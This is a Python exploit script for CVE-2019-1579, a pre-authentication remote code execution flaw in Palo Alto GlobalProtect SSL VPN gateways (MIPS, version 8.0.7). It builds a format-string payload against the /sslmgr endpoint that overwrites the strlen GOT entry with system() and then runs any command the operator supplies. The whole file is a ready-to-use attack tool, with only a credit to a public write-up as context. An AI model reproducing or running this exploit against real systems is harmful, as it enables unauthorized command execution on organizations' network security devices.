#!/usr/bin/python
# Palo Alto RCE - MIPS - 8.0.7 (CVE-2019-1579)
#
# Based on https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html
#
# Dependencies:
# 	pip install requests
#
# Author: b0yd

import requests
import sys
import struct
import argparse

requests.packages.urllib3.disable_warnings()
proxies = None

# Comment out if not using a proxy like Burp, etc
#proxies = {
#  'http': 'http://127.0.0.1:8080',
#  'https': 'http://127.0.0.1:8080',
#}

def exploit(ip, cmd):

	url = "https://%s/sslmgr" % ip

	strlen_GOT = 0x100396C0
	system_PLT = 0x1001FC00

	# Address to write to
	palo_host_addr = strlen_GOT #strlen GOT
	palo_str = struct.pack(">Q", palo_host_addr)
	palo_safe = palo_str.replace("\x00","%10$c")
	palo_str2 = struct.pack(">Q", palo_host_addr+4)
	palo_safe2 = palo_str2.replace("\x00","%10$c")
	palo_str3 = struct.pack(">Q", palo_host_addr+6)
	palo_safe3 = palo_str3.replace("\x00","%10$c")

	# Address being written
	ampresand = system_PLT #system PLT
	fmt = '%126$n'
	fmt += '%' + str((ampresand>>16)&0xffff) + 'c'
	fmt += '%179$hn'
	fmt += '%' + str((ampresand&0xffff)-((ampresand>>16)&0xffff)) + 'c'
	fmt += '%171$hn'

	data = "scep-profile-name=" # Offset 179
	data += palo_safe2
	data += "&appauthcookie="
	data += palo_safe3          # Offset 171
	data += "&host-id="
	data += palo_safe           # Offset 126
	data += "&user-email="
	data += fmt
	data += "&user="
	data += cmd

	r = requests.post(url, data=data, proxies=proxies, verify=False)
	out = r.text
	print out

def exec_cmd(ip, cmd):

	url = "https://%s/sslmgr" % ip

	data = "scep-profile-name="
	data += cmd

	r = requests.post(url, data=data, proxies=proxies, verify=False)
	out = r.text
	print out

parser = argparse.ArgumentParser(description='Send an email.')
parser.add_argument('-i', dest='ip', help='IP Address of the Palo Alto Global Protect Gateway.', required=True)
parser.add_argument('-c', dest='cmd', help='Command to run', required=True)
parser.add_argument('-e', dest='exploit_srv', help='Exploit server. (Swaps strlen and system)', action='store_true')
parser.set_defaults(exploit_srv=False)

args = parser.parse_args()
ip = args.ip
cmd = args.cmd

# Run exploit or just send cmd as arg
if args.exploit_srv:
	exploit(ip, cmd)
else:
	exec_cmd(ip, cmd)

